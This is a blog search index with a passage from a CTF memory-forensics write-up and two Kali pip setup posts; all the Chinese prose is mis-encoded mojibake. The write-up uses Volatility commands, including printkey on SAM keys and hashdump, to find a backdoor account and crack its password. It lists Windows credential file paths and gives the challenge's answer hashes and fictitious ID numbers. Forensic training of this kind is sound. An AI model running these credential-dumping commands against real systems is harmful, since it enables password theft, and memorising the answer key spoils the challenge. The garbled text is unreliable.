<li>å†è¿›å…¥åˆ°<code>basecrack</code>çš„ç›®å½•ä¹‹ä¸‹</li>
<li>ä½¿ç”¨<code>pip</code>ç›¸å…³å‘½ä»¤è¿›è¡Œå®‰è£…</li>
</ul>
<p>å…·ä½“ä½¿ç”¨æ–¹æ³•è§<code>readme.md</code><br>
ä¸€èˆ¬æƒ…å†µä¸‹ä¼šç”¨<code>python3 basecrack.py -f [filename] -m</code>å³å¯ã€‚<br>
åŸºæœ¬å°±èƒ½ç›´æ¥ä½¿ç”¨å·¥å…·å»è§£å¯†baseç³»åˆ—çš„é¢˜ç›®äº†ã€‚</p>
<h1>é•œåƒæ–‡ä»¶ç®€å•åˆ†æ</h1>
<blockquote>
<p><a href="https://github.com/volatilityfoundation/volatility">GitHub - volatilityfoundation/volatility: An advanced memory forensics framework</a></p>
</blockquote>
<blockquote>
<p>å…·ä½“çš„æ€è·¯éœ€è¦æ¢³ç†ä¸€ä¸‹ã€‚</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æŸå…¬å¸æœåŠ¡å™¨å‡ºç°äº†æ•°æ®æ³„éœ²ï¼Œè¯·åˆ†ææ–‡ä»¶å›ç­”ä¸‹åˆ—é—®é¢˜</span><br><span class="line"></span><br><span class="line">1ã€ç»æ£€æŸ¥ï¼Œæ”»å‡»è€…åˆ©ç”¨IPCæ¼æ´ç›‘æ§äº†æœåŠ¡å™¨ï¼Œæ”»å‡»è€…çš„IPåœ°å€çš„32ä½å°å†™md5å€¼å³ä¸ºç­”æ¡ˆã€‚ï¼ˆå¦‚ï¼Œæ”»å‡»è€…ipåœ°å€ä¸º192.168.1.1ï¼Œåˆ™ç­”æ¡ˆä¸º66efff4c945d3c3b87fc271b47d456dbï¼‰</span><br><span class="line"></span><br><span class="line">ç­”ï¼š2b714710cb93b5eb3295ff8b51819081</span><br><span class="line"></span><br><span class="line">2ã€æ”»å‡»è€…åˆ©ç”¨æœåŠ¡å™¨å†…ç”¨æˆ·å‘½åè§„åˆ™åˆ›å»ºäº†åé—¨è´¦å·ï¼Œè¯·æ‰¾å‡ºè¯¥åé—¨è´¦å·ï¼Œè¯¥è´¦å·çš„ç™»å½•å¯†ç çš„32ä½å°å†™md5å€¼å³æ˜¯ç­”æ¡ˆã€‚ï¼ˆä¾‹ï¼šå¯†ç ä¸º123456ï¼Œåˆ™ç­”æ¡ˆä¸ºe10adc3949ba59abbe56e057f20f883eï¼‰</span><br><span class="line"></span><br><span class="line">ç­”ï¼š5e8667a439c68f5145dd2fcbecf02209</span><br><span class="line"></span><br><span class="line">3ã€æ”»å‡»è€…ä»æœåŠ¡å™¨ä¸­çªƒå–äº†ä¸€äº›ä¸ªäººæ•æ„Ÿæ•°æ®ï¼Œè¯·åˆ†ææ–‡ä»¶ï¼Œæ‰¾åˆ°åŒ…å«çš„æ‰€æœ‰èº«ä»½è¯ä¿¡æ¯(å…±5ä¸ª)ï¼Œå¹¶æŒ‰ç…§èº«ä»½è¯é¦–ä½æ•°å­—ä»å°åˆ°å¤§è¿›è¡Œæ’åºé¡ºåºï¼ˆé¦–ä½æ•°å­—ç›¸åŒåˆ™æ¯”è¾ƒç¬¬äºŒä½æ•°å­—ï¼Œä»¥æ­¤ç±»æ¨ï¼‰ï¼Œå¹¶ä»¥-è¿›è¡Œè¿æ¥ï¼Œæœ€åè®¡ç®—å…¶32ä½å°å†™MD5å€¼ä½œä¸ºç­”æ¡ˆï¼ˆä¾‹ï¼šèº«ä»½è¯1ï¼š123456789ï¼›èº«ä»½è¯2ï¼š987654321ï¼›èº«ä»½è¯3ï¼š111111111ï¼Œåˆ™èº«ä»½è¯é¡ºåºï¼š111111111-123456789-987654321ï¼Œç­”æ¡ˆä¸ºï¼š1f18992fb75aaa7f34c8b6583fb3ac1eï¼‰ï¼ˆæ³¨ï¼šé¢˜ç›®ä¸­èº«ä»½è¯ä¿¡æ¯ç­‰ä¸ªäººä¿¡æ¯ä¸ºå‡ºé¢˜éœ€è¦ç¼–å†™ï¼Œå‡ä¸ºè™šå‡ä¿¡æ¯ï¼Œä¸å…·å¤‡çœŸå®æ€§åŠæ•ˆç›Šã€‚ï¼‰</span><br><span class="line"></span><br><span class="line">ç­”ï¼š140bc19db32fec044a87d6130eab854f</span><br></pre></td></tr></table></figure>
<h2 id="äº†è§£é•œåƒæ–‡ä»¶ä½¿ç”¨ç³»ç»Ÿ">äº†è§£é•œåƒæ–‡ä»¶ä½¿ç”¨ç³»ç»Ÿ</h2>
<ul>
<li><code>vol.py -f [rawfile] imageinfo</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åŸºäºæœåŠ¡å™¨æè¿°ï¼Œä¸»è¦é€‰æ‹©çš„æ–¹å‘å°±æ˜¯<code>Win2008</code>ç³»åˆ—çš„ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¼˜å…ˆè€ƒè™‘ç›¸å¯¹é å‰ä½ç½®çš„æ“ä½œç³»ç»Ÿã€‚</p>
<h3 id="netscan"><code>netscan</code></h3>
<ul>
<li>æŸ¥çœ‹ç½‘ç»œè¿æ¥</li>
<li>æŸ¥çœ‹å½“å‰ç³»ç»ŸIP</li>
</ul>
<h2 id="IPCæ¼æ´æ§åˆ¶æœåŠ¡å™¨">IPCæ¼æ´æ§åˆ¶æœåŠ¡å™¨</h2>
<blockquote>
<p>é¢˜ç›®ä¸­æç¤ºä¿¡æ¯ï¼šæ”»å‡»è€…åˆ©ç”¨IPCæ¼æ´ç›‘æ§äº†æœåŠ¡å™¨</p>
</blockquote>
<ul>
<li>æ¼æ´åˆ©ç”¨æ¡ä»¶ï¼šå¼€æ”¾äº† 139ã€445 ç«¯å£å’ŒÂ ipc$ æ–‡ä»¶å…±äº«ï¼Œå¹¶ä¸”æˆ‘ä»¬å·²ç»è·å–åˆ°ç”¨æˆ·ç™»å½•è´¦å·å’Œå¯†ç ã€‚</li>
<li>ä¸»è¦è¿™ä¸ªæ¼æ´åœ¨WinServer2008ä¸­å¥½åƒæ¯”è¾ƒå…¸å‹</li>
</ul>
<h2 id="è´¦å·ç›¸å…³ä¸€èˆ¬è€ƒè™‘æ³¨å†Œè¡¨ç›¸å…³ä¿¡æ¯">è´¦å·ç›¸å…³ä¸€èˆ¬è€ƒè™‘æ³¨å†Œè¡¨ç›¸å…³ä¿¡æ¯</h2>
<ul>
<li>hivelist</li>
<li>hivedumpï¼šæŸ¥çœ‹æ³¨å†Œè¡¨é”®å
<ul>
<li>è¯•äº†ä¸€ä¸‹æš‚ä¸”ä¸èƒ½ç†è§£ä¸ºå•¥éœ€è¦è¿™ç§å‘½ä»¤ï¼Œä»¥åŠæ”¾çš„è™šæ‹Ÿåœ°å€å…·ä½“éœ€è¦æŸ¥çœ‹å•¥ã€‚</li>
</ul>
</li>
<li>printkey</li>
<li>hashdump</li>
</ul>
<h3 id="hivelist"><code>hivelist</code></h3>
<ul>
<li>åˆ—å‡ºæ‰€æœ‰çš„æ³¨å†Œè¡¨é¡¹åŠå…¶è™šæ‹Ÿåœ°å€å’Œç‰©ç†åœ°å€</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntds.ditæ–‡ä»¶ä½ç½®: C:\Windows\NTDS\NTDS.dit</span><br><span class="line">systemæ–‡ä»¶ä½ç½®:C:\Windows\System32\config\SYSTEM</span><br><span class="line">samæ–‡ä»¶ä½ç½®:C:\Windows\System32\config\SAM</span><br><span class="line">#é€šè¿‡SAMæ•°æ®åº“è·å¾—ç”¨æˆ·hashçš„æ–¹æ³•</span><br></pre></td></tr></table></figure>
<p>åœ¨è¿™ä¸€å—åŸºæœ¬æ‰¾å…·ä½“è¦åˆ†æçš„æ³¨å†Œè¡¨çš„è·¯å¾„ä½ç½®ï¼Ÿ<br>
æ‰¾æ¯”è¾ƒå¯è¡Œçš„è·¯å¾„ï¼Ÿ<br>
ä¸å¤ªç†è§£ã€‚</p>
<h3 id="hivedump"><code>hivedump</code></h3>
<ul>
<li>æ³¨å†Œè¡¨ç›¸å…³ä¿¡æ¯ç½—åˆ—</li>
</ul>
<p>è¿™è¾¹èƒ½æ‰¾åˆ°ä¸€å †<code>user1</code>ç­‰ç›¸å…³è´¦å·ï¼Œç›¸å¯¹æ¥è¯´æ¯”è¾ƒå¯ç–‘ã€‚<br>
æ‰€ä»¥èƒ½å¤Ÿå®šä½åˆ°<code>\SAM\Domains\Account\Users\Names</code></p>
<h3 id="printkey"><code>printkey</code></h3>
<ul>
<li>
<p><code>vol.py -f data1.raw --profile=Win2008R2SP0x64 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</code> ä¸»è¦è¿™è¾¹çš„è·¯å¾„å»çœ‹å…·ä½“å†…å®¹ï¼Œçœ‹ä¸åˆ°Få€¼ï¼Œæ²¡æ³•è¿›è¡Œå¯¹æ¯”</p>
</li>
<li>
<p>ç¨å¾®å¾€ä¸Šä¸€çº§å»çœ‹å…·ä½“å†…å®¹</p>
</li>
<li>
<p><code>vol.py -f data1.raw --profile=Win2008R2SP0x64 printkey -K &quot;SAM\Domains\Account\Users&quot;</code> ä¸Šä¸€çº§å¯ä»¥æŸ¥çœ‹ç›®å½•ä¸‹çš„å…·ä½“å‚æ•°</p>
</li>
<li>
<p>é€ä¸ªè¿›è¡Œ<code>F</code>å€¼çš„å¯¹æ¯”ï¼Œè·Ÿ<code>Administrator</code>è¿›è¡Œå¯¹æ¯”</p>
</li>
<li>
<p><code>vol.py -f data1.raw --profile=Win2008R2SP0x64 printkey -K &quot;SAM\Domains\Account\Users\000001F4&quot;</code>ï¼ŒAdministrator</p>
</li>
<li>
<p><code>vol.py -f data1.raw --profile=Win2008R2SP0x64 printkey -K &quot;SAM\Domains\Account\Users\000003F1&quot;</code>ï¼Œuser7</p>
</li>
<li>
<p>ä¸¤è€…ç»è¿‡å¯¹æ¯”å‘ç°<code>F</code>å€¼æ¯”è¾ƒç±»ä¼¼ï¼Œæ‰€ä»¥é«˜æƒé™çš„åé—¨è´¦å·æ˜¯<code>user7</code></p>
</li>
<li>
<p><strong>è¡¥å……</strong>ï¼š<code>printkey -K &quot;ControlSet001\Control\ComputerName\ComputerName&quot;</code>è·å–ä¸»æœºå</p>
</li>
</ul>
<h3 id="hashdump"><code>hashdump</code></h3>
<blockquote>
<p><a href="https://hello-ctf.com/HC_MISC/memory/#mimikatz">https://hello-ctf.com/HC_MISC/memory/#mimikatz</a><br>
<a href="https://wiki.wgpsec.org/knowledge/ctf/Volatility.html">ã€MISCã€‘Volatilityå–è¯åˆ†æå·¥å…· | ç‹¼ç»„å®‰å…¨å›¢é˜Ÿå…¬å¼€çŸ¥è¯†åº“</a></p>
</blockquote>
<ul>
<li><code>vol.py -f data1.raw --profile=Win2008R2SP0x64 hashdump</code></li>
<li>ç›´æ¥å®šä½<code>user7</code>æ‰¾åˆ°å“ˆå¸Œå€¼ï¼Œç„¶åä¸Šåœ¨çº¿ç½‘ç«™è¿›è¡Œåå‘æŸ¥æ‰¾å¾—åˆ°</li>
<li><code>87654321</code></li>
</ul>
<h2 id="æ–‡ä»¶ç›¸å…³ä¸»è¦è€ƒè™‘åˆ©ç”¨å¯ç–‘è¿›ç¨‹æŠŠæ•°æ®dumpä¸‹æ¥">æ–‡ä»¶ç›¸å…³ä¸»è¦è€ƒè™‘åˆ©ç”¨å¯ç–‘è¿›ç¨‹æŠŠæ•°æ®dumpä¸‹æ¥</h2>
<ul>
<li>pstree/pslist</li>
<li>memdump</li>
<li>editbox</li>
<li>filescan</li>
<li>dumpfile</li>
</ul>
<h3 id="pstree-pslist"><code>pstree/pslist</code></h3>
<ul>
<li><code>vol.py -f data1.raw --profile=Win2008R2SP0x64 pstree</code>ï¼Œå­˜åœ¨ä»¥ä¸‹å¯ç–‘è¿›ç¨‹
<ul>
<li><code>notepad.exe</code>ï¼štxt</li>
<li><code>et.exe</code>ï¼šxlsx/xls</li>
<li><code>mspaint.exe</code>ï¼šåŸå§‹æ•°æ®<code>.data</code>å‹</li>
</ul>
</li>
</ul>
<h3 id="memdump"><code>memdump</code></h3>
<ul>
<li><code>vol.py -f data1.raw --profile=Win2008R2SP0x64 memdump -p 952 -D vol_output</code></li>
<li>å¾—åˆ°çš„dmpæ–‡ä»¶ä¿®æ”¹åç¼€åä¸º<code>.data</code></li>
<li>ä½¿ç”¨<code>gimp</code>è¿›è¡Œè¯»å–æŸ¥çœ‹</li>
<li>ä¸€èˆ¬æŸ¥çœ‹å›¾ç‰‡æ€è·¯ï¼š<code>height</code>å…ˆç¡®å®šï¼Œ<code>offset</code>å…ˆæ‰¾åˆ°å¤§æ¦‚æœ‰å­—ç¬¦çš„éƒ¨åˆ†ï¼Œç„¶åè°ƒæ•´<code>width</code>ä½¿å¾—å›¾ç‰‡æ­£å¸¸æ˜¾ç¤º</li>
<li>å¾—åˆ°<code>513701199912314701</code></li>
</ul>
<h3 id="editbox"><code>editbox</code></h3>
<ul>
<li><code>vol.py -f data1.raw --profile=Win2008R2SP0x64 editbox</code><br>
ç›´æ¥èƒ½çœ‹åˆ°txtæ–‡ä»¶é‡Œé¢çš„å†…å®¹ã€‚</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¼ ä¸‰    13528790688     430512198908131367</span><br><span class="line">æå››    18234924149     310115199110257136</span><br></pre></td></tr></table></figure>
<h3 id="filescan"><code>filescan</code></h3>
<ul>
<li>é€šè¿‡<code>grep</code>è¾…åŠ©æŸ¥æ‰¾å…³é”®æ–‡ä»¶ç±»å‹</li>
<li><code>vol.py -f data1.raw --profile=Win2008R2SP0x64 filescan | grep -E '|.txt|.xls|.xlsx' </code></li>
<li>ä½†æ˜¾ç¤ºçš„æœ‰ç‚¹å¥‡å¥‡æ€ªæ€ªçš„ï¼Œæ‰¾åˆ°å…³é”®æ–‡ä»¶ä¹‹åç»“åˆ<code>dumpfile</code>è¿›è¡Œæå–</li>
</ul>
<h3 id="dumpfile"><code>dumpfile</code></h3>
<ul>
<li>å¯¼å‡ºæŸä¸€æ–‡ä»¶(æŒ‡å®šè™šæ‹Ÿåœ°å€)</li>
<li><code>vol.py -f data1.raw --profile=Win2008R2SP0x64 dumpfiles -Q 0x000000007eddf750 --dump-dir=vol_output</code></li>
<li>æˆ–è€…<code>--dump-dir=</code>ç”¨<code>-D </code>æ›¿ä»£</li>
<li>å¯¼å‡ºæ¥çš„ä¸€èˆ¬æ˜¯<code>.dat</code>çš„æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨<code>foremost</code>è¿›è¡ŒæŸ¥çœ‹</li>
<li>ä¸è¿‡ç”±äºæ ¼å¼ç‰¹æ®Šæ€§ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œ<code>.xlsx</code>æ–‡ä»¶å®¹æ˜“è¢«è¯†åˆ«æˆ<code>.zip</code>ï¼Œéœ€è¦ç®€å•æŸ¥çœ‹å†…å®¹æœ‰æ²¡æœ‰ç¼ºå¤±ï¼Œç„¶åä¿®æ”¹åç¼€åä¸º<code>.xlsx</code></li>
</ul>
<p>æŸ¥çœ‹<code>xlsx</code>é‡Œé¢çš„å†…å®¹ï¼Œå¯ä»¥å¾—åˆ°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|å®¢æˆ·å§“å|èº«ä»½è¯|</span><br><span class="line">|å¼ ä¼Ÿ|652901196611026716|</span><br><span class="line">|ææ˜Ÿæ€¡|123456202001011236|</span><br></pre></td></tr></table></figure>
<p>ç„¶åæŒ‰ç…§è¦æ±‚è¿›è¡Œæ‹¼æ¥ã€‚</p>
<p>åé¢ä¸»è¦æ¶‰åŠç»“åˆ<code>gimp</code>å»dumpå‡ºæ¥çš„å›¾ç‰‡ã€‚</p>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>basecrack</tag>
        <tag>gimp</tag>
        <tag>ciphey</tag>
        <tag>pwntools</tag>
        <tag>volatility</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali-Pip3å®‰è£…è™šæ‹Ÿç¯å¢ƒ</title>
    <url>/2024/12/05/kali-pip3%E5%AE%89%E8%A3%85%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<p><code>kali-2024</code>ç‰ˆæœ¬ï¼Œæ­å»ºpython3çš„è™šæ‹Ÿç¯å¢ƒï¼Œåœ¨è™šæ‹Ÿç¯å¢ƒä¸­å¯ä»¥ç›´æ¥è°ƒç”¨<code>pip3</code>ï¼Œå¦åˆ™åœ¨æœ¬åœ°ç¯å¢ƒä¸å¤ªå¥½ç”¨ã€‚</p>
<p>ä½“æ„Ÿè™šæ‹Ÿç¯å¢ƒé™¤äº†ä¸ªè¦è¿›å…¥åˆ°è™šæ‹Ÿç¯å¢ƒè¿™ä¸ªæ“ä½œï¼Œå…¶ä»–å€’æ˜¯å’Œä¹‹å‰æ— è™šæ‹Ÿç¯å¢ƒç”¨æ³•ä¸€è‡´ã€‚</p>
<span id="more"></span><!--toc-->
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error: externally-managed-environment</span><br><span class="line"></span><br><span class="line">Ã— This environment is externally managed</span><br><span class="line">â•°â”€&gt; To install Python packages system-wide, try apt install</span><br><span class="line">    python3-xyz, where xyz is the package you are trying to</span><br><span class="line">    install.</span><br><span class="line">    </span><br><span class="line">    If you wish to install a non-Kali-packaged Python package,</span><br><span class="line">    create a virtual environment using python3 -m venv path/to/venv.</span><br><span class="line">    Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make</span><br><span class="line">    sure you have pypy3-venv installed.</span><br><span class="line">    </span><br><span class="line">    If you wish to install a non-Kali-packaged Python application,</span><br><span class="line">    it may be easiest to use pipx install xyz, which will manage a</span><br><span class="line">    virtual environment for you. Make sure you have pipx installed.</span><br><span class="line">    </span><br><span class="line">    For more information, refer to the following:</span><br><span class="line">    * https://www.kali.org/blog/python-externally-managed/</span><br><span class="line">    * /usr/share/doc/python3.12/README.venv</span><br><span class="line"></span><br><span class="line">note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.</span><br><span class="line">hint: See PEP 668 for the detailed specification.</span><br><span class="line"># </span><br></pre></td></tr></table></figure>
<p>æŠ¥é”™åŸå› å¦‚ä¸Šã€‚<br>
æ€»ä¹‹æ˜¯ä¸ºäº†é¿å…å†²çªæ‰€ä»¥è¿›è¡Œäº†é™åˆ¶ã€‚</p>
<h1>1. åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ</h1>
<p>åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒï¼Œåœ¨è¯¥è™šæ‹Ÿç¯å¢ƒä¸­å¯ä»¥è‡ªç”±ä½¿ç”¨<code>pip</code>è¿›è¡Œç›¸å…³åº“çš„å®‰è£…è€Œä¸å½±å“ç³»ç»Ÿçº§åˆ«çš„Pythonç¯å¢ƒã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-env</span><br><span class="line">python3 -venv [è™šæ‹Ÿç¯å¢ƒåç§°]</span><br></pre></td></tr></table></figure>
<p>æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> [è™šæ‹Ÿç¯å¢ƒåç§°]/bin/activate</span><br></pre></td></tr></table></figure>
<p>è¿›å…¥åˆ°è™šæ‹Ÿç¯å¢ƒè¿›è¡Œå®‰è£…åº“</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install [åº“å]</span><br></pre></td></tr></table></figure>
<p>é€€å‡ºè™šæ‹Ÿç¯å¢ƒ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure>
<h1>2. ä½¿ç”¨pipxå®‰è£…åº”ç”¨ç¨‹åº</h1>
<blockquote>
<p>ç†è®ºä¸Šï¼Œæœ¬èº«è‡ªå·±æ²¡æœ‰è¿›è¡Œå®‰è£…æµ‹è¯•ã€‚</p>
</blockquote>
<p>å®‰è£…å‘½ä»¤è¡Œå·¥å…·æˆ–è€…åº”ç”¨ç¨‹åºï¼Œå¸Œæœ›å…¨å±€å¯ç”¨ï¼Œä½†ä¸å¸Œæœ›å¹²æ‰°åˆ°ç³»ç»Ÿçš„pythonç¯å¢ƒï¼Œå¯ä»¥ä½¿ç”¨<code>pipx</code>ï¼Œé¦–å…ˆå®‰è£…ä¸€ä¸ª<code>pipx</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install pipx</span><br><span class="line">pipx ensurepath</span><br><span class="line">pipx install [åº“å]</span><br></pre></td></tr></table></figure>
<h1>è™šæ‹Ÿç¯å¢ƒå¦‚ä½•æé«˜æƒé™</h1>
<p>å®‰è£…ç›¸å…³åº“çš„æ—¶å€™ï¼Œå¾€å¾€éœ€è¦é«˜æƒé™æ‰èƒ½è¿›è¡Œç›¸å…³åº“çš„å®‰è£…ã€‚</p>
<ul>
<li>å…ˆè¿›å…¥ç®¡ç†å‘˜æƒé™</li>
<li>ç„¶åä½¿ç”¨<code>source []/bin/activate</code>è¿›å…¥åˆ°æ­å»ºçš„è™šæ‹Ÿç¯å¢ƒä¸­</li>
</ul>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>kali2024</tag>
        <tag>pip3</tag>
        <tag>virtual</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali-Pip2å®‰è£…</title>
    <url>/2024/12/05/kali-pip2%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p><code>kali-2024</code>ç‰ˆæœ¬ï¼Œpip2å®‰è£…ã€‚</p>
<span id="more"></span><!--toc-->
<h1>1. å®‰è£…setup-tools18.5</h1>
<p>ä¸‹è½½æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://pypi.python.org/packages/source/s/setuptools/setuptools-18.5.tar.gz </span><br><span class="line"><span class="comment"># å»ºè®®ç›´æ¥æœ¬åœ°æœºä¸‹è½½ä¸œè¥¿ç„¶åä¼ è¿›å»</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åè¿›è¡Œè§£å‹ç¼©</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf setuptools-18.5.tar.gz  </span><br><span class="line"><span class="built_in">cd</span> setuptools-18.5/</span><br><span class="line"><span class="comment"># æœ€å¥½åœ¨éç®¡ç†å‘˜æƒé™ä¹‹ä¸‹è¿›è¡Œä¸‹è½½</span></span><br></pre></td></tr></table></figure>
<p>rootæƒé™ä¹‹ä¸‹å®‰è£…ç›¸å…³ä¾èµ–</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo python2 setup.py build</span><br><span class="line">sudo python2 setup.py install</span><br></pre></td></tr></table></figure>
<h1>2.  å®‰è£…pip2</h1>
<p><a href="http://xn--2-zb2b494k.xn--7pip-bl7j.py">å®‰è£…2.7çš„pip.py</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line"><span class="comment"># å»ºè®®ç›´æ¥æœ¬åœ°æœºä¸‹è½½ä¸œè¥¿ç„¶åä¼ è¿›å»</span></span><br></pre></td></tr></table></figure>
<p>ç›´æ¥è¿è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo python2 get-pip.py</span><br></pre></td></tr></table></figure>
<h1>3. æµ‹è¯•pip2</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip2 --version</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>kali2024</tag>
        <tag>pip2</tag>
      </tags>
  </entry>
</search>
